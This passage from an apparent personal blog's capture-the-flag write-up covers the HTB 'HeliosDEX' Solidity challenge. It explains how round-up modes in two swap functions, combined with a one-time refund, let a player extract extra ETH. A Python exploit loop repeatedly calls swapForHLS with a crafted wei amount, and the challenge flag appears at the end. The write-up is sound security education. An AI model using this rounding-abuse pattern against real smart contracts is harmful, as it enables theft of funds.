</span></span><span class=line><span class=cl>        <span class=kt>uint256</span> <span class=n>grossMal</span> <span class=o>=</span> <span class=n>Math</span><span class=p>.</span><span class=n>mulDiv</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>,</span> <span class=n>exchangeRatioMAL</span><span class=p>,</span> <span class=mi>1</span><span class=n>e18</span><span class=p>,</span> <span class=n>Math</span><span class=p>.</span><span class=n>Rounding</span><span class=p>(</span><span class=mi>1</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint256</span> <span class=n>fee</span> <span class=o>=</span> <span class=p>(</span><span class=n>grossMal</span> <span class=o>*</span> <span class=n>feeBps</span><span class=p>)</span> <span class=o>/</span> <span class=mi>10</span><span class=n>_000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint256</span> <span class=n>netMal</span> <span class=o>=</span> <span class=n>grossMal</span> <span class=o>-</span> <span class=n>fee</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>netMal</span> <span class=o>&lt;=</span> <span class=n>reserveMAL</span><span class=p>,</span> <span class=s>&#34;HeliosDEX: Helios grieves that the MAL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>reserveMAL</span> <span class=o>-=</span> <span class=n>netMal</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>malakarEssence</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>netMal</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>emit</span> <span class=n>HeliosBarter</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>malakarEssence</span><span class=p>),</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>,</span> <span class=n>netMal</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>swapForHLS</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=n>underHeliosEye</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint256</span> <span class=n>grossHLS</span> <span class=o>=</span> <span class=n>Math</span><span class=p>.</span><span class=n>mulDiv</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>,</span> <span class=n>exchangeRatioHLS</span><span class=p>,</span> <span class=mi>1</span><span class=n>e18</span><span class=p>,</span> <span class=n>Math</span><span class=p>.</span><span class=n>Rounding</span><span class=p>(</span><span class=mi>3</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint256</span> <span class=n>fee</span> <span class=o>=</span> <span class=p>(</span><span class=n>grossHLS</span> <span class=o>*</span> <span class=n>feeBps</span><span class=p>)</span> <span class=o>/</span> <span class=mi>10</span><span class=n>_000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint256</span> <span class=n>netHLS</span> <span class=o>=</span> <span class=n>grossHLS</span> <span class=o>-</span> <span class=n>fee</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>netHLS</span> <span class=o>&lt;=</span> <span class=n>reserveHLS</span><span class=p>,</span> <span class=s>&#34;HeliosDEX: Helios grieves that the HSL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>reserveHLS</span> <span class=o>-=</span> <span class=n>netHLS</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>heliosLuminaShards</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>netHLS</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>emit</span> <span class=n>HeliosBarter</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>heliosLuminaShards</span><span class=p>),</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>,</span> <span class=n>netHLS</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>oneTimeRefund</span><span class=p>(</span><span class=kt>address</span> <span class=n>item</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>amount</span><span class=p>)</span> <span class=k>external</span> <span class=n>heliosGuardedTrade</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=o>!</span><span class=n>hasRefunded</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>],</span> <span class=s>&#34;HeliosDEX: refund already bestowed upon thee&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>amount</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>,</span> <span class=s>&#34;HeliosDEX: naught for naught is no trade. Offer substance, or be gone!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>uint256</span> <span class=n>exchangeRatio</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>item</span> <span class=o>==</span> <span class=kt>address</span><span class=p>(</span><span class=n>eldorionFang</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>exchangeRatio</span> <span class=o>=</span> <span class=n>exchangeRatioELD</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nb>require</span><span class=p>(</span><span class=n>eldorionFang</span><span class=p>.</span><span class=n>transferFrom</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=n>amount</span><span class=p>),</span> <span class=s>&#34;ELD transfer failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>reserveELD</span> <span class=o>+=</span> <span class=n>amount</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>item</span> <span class=o>==</span> <span class=kt>address</span><span class=p>(</span><span class=n>malakarEssence</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>exchangeRatio</span> <span class=o>=</span> <span class=n>exchangeRatioMAL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nb>require</span><span class=p>(</span><span class=n>malakarEssence</span><span class=p>.</span><span class=n>transferFrom</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=n>amount</span><span class=p>),</span> <span class=s>&#34;MAL transfer failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>reserveMAL</span> <span class=o>+=</span> <span class=n>amount</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>item</span> <span class=o>==</span> <span class=kt>address</span><span class=p>(</span><span class=n>heliosLuminaShards</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>exchangeRatio</span> <span class=o>=</span> <span class=n>exchangeRatioHLS</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nb>require</span><span class=p>(</span><span class=n>heliosLuminaShards</span><span class=p>.</span><span class=n>transferFrom</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=n>amount</span><span class=p>),</span> <span class=s>&#34;HLS transfer failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>reserveHLS</span> <span class=o>+=</span> <span class=n>amount</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;HeliosDEX: Helios descries forbidden offering&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>uint256</span> <span class=n>grossEth</span> <span class=o>=</span> <span class=n>Math</span><span class=p>.</span><span class=n>mulDiv</span><span class=p>(</span><span class=n>amount</span><span class=p>,</span> <span class=mi>1</span><span class=n>e18</span><span class=p>,</span> <span class=n>exchangeRatio</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>uint256</span> <span class=n>fee</span> <span class=o>=</span> <span class=p>(</span><span class=n>grossEth</span> <span class=o>*</span> <span class=n>feeBps</span><span class=p>)</span> <span class=o>/</span> <span class=mi>10</span><span class=n>_000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint256</span> <span class=n>netEth</span> <span class=o>=</span> <span class=n>grossEth</span> <span class=o>-</span> <span class=n>fee</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>hasRefunded</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>payable</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>).</span><span class=nb>transfer</span><span class=p>(</span><span class=n>netEth</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>emit</span> <span class=n>HeliosRefund</span><span class=p>(</span><span class=n>item</span><span class=p>,</span> <span class=n>amount</span><span class=p>,</span> <span class=n>netEth</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Upon deployment, the HeliosDEX contract creates 3 ERC20 tokens: <strong>EldorionFang, MalakarEssence, and HeliosLuminaShards</strong> are each deployed with a specified initial supply. At compilation time exchange rates for these tokens are defined:</p><ul><li><strong>ELD:</strong> 2 tokens per 1 ETH</li><li><strong>MAL:</strong> 4 tokens per 1 ETH</li><li><strong>HLS:</strong> 10 tokens per 1 ETH</li></ul><p>Additionally, a fee is deducted from every swap. The fee is defined by <code>feeBps</code> (25 basis points or 0.25%). This fee is applied after calculating the gross token amount, reducing the net tokens that the user receives.</p><p>Focusing on the main functionalities, we notice three swap functions, each with its own rounding mechanism and token exchange rate. Each swap function uses the <a href=https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/Math.sol#L277-L282 target=_blank><code>Math.mulDiv</code> from the OZ <code>Math.sol</code> library</a> to calculate the gross out tokens, specifying also the rounding direction. Each swap function defines a different rounding behavior based on the <a href=https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/Math.sol#L13-L18 target=_blank><code>Rounding</code> struct of the lib</a>:</p><ul><li><strong><code>swapForELD()</code></strong>: Uses the &ldquo;<code>Floor</code>&rdquo; rounding mode (denoted as value 0). <strong>This rounding direction effectively rounds down to the nearest integer</strong>, meaning that on floating-point results, the output tokens amount is truncated favorably to the contract.</li><li><strong><code>swapForMAL()</code></strong>: Uses the &ldquo;<code>Ceil</code>&rdquo; rounding mode (denoted as value 1). <strong>This rounding direction effectively rounds up to the nearest integer</strong>, meaning that on floating-point results like <code>1.50000001</code>, the output tokens amount is rounded up to <code>2</code> tokens, returning a favorable amount to the player respectively to the initial swap value.</li><li><strong><code>swapForHLS()</code></strong>: Uses the &ldquo;<code>Expand</code>&rdquo; rounding mode (denoted as value 3). <strong>This rounding direction ALWAYS rounds up</strong>, meaning that on floating-point results like <code>1.00000001</code>, the output tokens amount is rounded up to <code>2</code> tokens, returning a <strong>VERY</strong> favorable amount to the player respectively to the initial swap value.</li></ul><p>Based on that observation, we understand that we can exploit the <code>swapForHLS</code> and <code>swapForMAL</code> functions with specifically crafted swap values such that when divided by the exchange rate, the result is a floating-point number that will be rounded up, thus giving us more tokens than expected.</p><p>Moreover, a refund function (<code>oneTimeRefund</code>) is implemented and it&rsquo;s based on the hardcoded original exchange rates that allows users to return tokens in exchange back for Ethers. Given that functionality, we can exploit the rounding behavior to later monetize profitable trades back to ETH.</p><p>However, one limitation is that the refund function only allows a one-time operation per user (tracked by <code>hasRefunded</code>), so we need to accumulate enough tokens that will allow us to gain a significant amount of ETH in a single refund operation.</p><h2 class="relative group">Exploitation<div id=exploitation class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#exploitation aria-label=Anchor>#</a></span></h2><p>At this point is clear that we can leverage ceil-roundings on swap operations like <code>swapForHLS</code> (&ldquo;Expand&rdquo; rounding mode) and <code>swapForMAL</code> (&ldquo;Ceil&rdquo; rounding mode) to swap a large amount of tokens via favorable exchange rates, and finally refund them all back to ETH with a one-shot refund trade.<br>If the total ETH gain accumulated from each trade doubles the player initial ETH balance, then we&rsquo;ve solved the challenge.<br>The problem on leveraging the <code>swapForMAL</code> swaps is that based on the &ldquo;Ceil&rdquo; rounding mode, we can gain at most 1.5x value from a single trade. Given that the player&rsquo;s initial balance it&rsquo;s 12 ETH, we can get at most 12 ETH * 1.5 = 18 ETH from a one-shot refund trade.<br>To overcome this limitation, we can use the <code>swapForHLS</code> swaps based on the &ldquo;Expand&rdquo; rounding mode, which allows us to gain 2x value from each trade, thus reaching the 20 ETH goal.</p><p>The exploit script will just be a controlled loop that repeats the <code>swapForHLS</code> trades until we reach the desired projected gain:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=p>[</span><span class=o>...</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>trade_cost</span> <span class=o>=</span> <span class=mi>10</span><span class=o>**</span><span class=mi>17</span> <span class=o>+</span> <span class=mi>1</span> 
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>n_trades</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n\n</span><span class=s2>[+] Trade #</span><span class=si>{</span><span class=n>n_trades</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># trigger rounding up to ceil with just 1 wei</span>
</span></span><span class=line><span class=cl>        <span class=n>csend</span><span class=p>(</span><span class=n>target_addr</span><span class=p>,</span> <span class=s2>&#34;swapForHLS()&#34;</span><span class=p>,</span> <span class=n>value</span><span class=o>=</span><span class=nb>str</span><span class=p>(</span><span class=n>trade_cost</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># get current HLS balance</span>
</span></span><span class=line><span class=cl>        <span class=n>hls_balance</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ccall</span><span class=p>(</span><span class=n>hls_token</span><span class=p>,</span> <span class=s2>&#34;balanceOf(address)(uint256)&#34;</span><span class=p>,</span> <span class=n>player_account</span><span class=o>.</span><span class=n>address</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] current HLS balance: </span><span class=si>{</span><span class=n>hls_balance</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>eth_gain</span> <span class=o>=</span> <span class=p>((</span><span class=n>hls_balance</span> <span class=o>-</span> <span class=n>prev_hsl_balance</span><span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=mi>10</span><span class=o>**</span><span class=mi>18</span> <span class=o>/</span> <span class=n>exchange_ratio_hsl</span><span class=p>))</span> <span class=o>-</span> <span class=n>trade_cost</span>
</span></span><span class=line><span class=cl>        <span class=n>total_eth_gain</span> <span class=o>=</span> <span class=p>(</span><span class=n>hls_balance</span> <span class=o>*</span> <span class=p>(</span><span class=mi>10</span><span class=o>**</span><span class=mi>18</span> <span class=o>/</span> <span class=n>exchange_ratio_hsl</span><span class=p>))</span> <span class=o>-</span> <span class=p>(</span><span class=n>trade_cost</span><span class=p>)</span> <span class=o>*</span> <span class=n>n_trades</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] ETH gain from the trade: </span><span class=si>{</span><span class=n>eth_gain</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] total projected ETH gain: </span><span class=si>{</span><span class=n>total_eth_gain</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>assert</span> <span class=n>hls_balance</span> <span class=o>&gt;</span> <span class=n>prev_hsl_balance</span>
</span></span><span class=line><span class=cl>        <span class=k>assert</span> <span class=n>eth_gain</span> <span class=o>&gt;</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=n>prev_hsl_balance</span> <span class=o>=</span> <span class=n>hls_balance</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>total_eth_gain</span> <span class=o>&gt;=</span> <span class=mf>10e18</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>...</span><span class=p>]</span>
</span></span></code></pre></div><p>see the full exploitation script <a href=./htb/solver.py>here</a>.</p><hr><blockquote><p><code>HTB{0n_Heli0s_tr4d3s_a_d3cim4l_f4d3s_and_f0rtun3s_ar3_m4d3}</code></p></blockquote></div></div><script type=text/javascript src=/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_posts/HTB-CyberApocalypse-2025/HeliosDEX/index.md data-oid-likes=likes_posts/HTB-CyberApocalypse-2025/HeliosDEX/index.md></script></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span class="flex flex-col"><a class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" href=/posts/irisctf-2025/webwebhookhook/><span class=leading-6><span class="inline-block rtl:rotate-180">&larr;</span>&ensp;IrisCTF 2025 - webwebhookhook
</span></a><span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2025-01-12T00:00:00+01:00>12 January 2025</time>
</span></span><span class="flex flex-col items-end"><a class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" href=/posts/htb-cyberapocalypse-2025/eldorion/><span class=leading-6>HTB Cyber Apocalypse 2025 - Eldorion [Author Writeup]&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
</span></a><span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2025-03-15T00:00:00+01:00>15 March 2025</time></span></span></div></div></footer></article><div id=scroll-to-top class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200"><a href=#the-top class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex list-none flex-col sm:flex-row"><li class="flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/tags/ title=Tags>Tags</a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2025
simonedimaria</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://simonedimaria.xyz/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>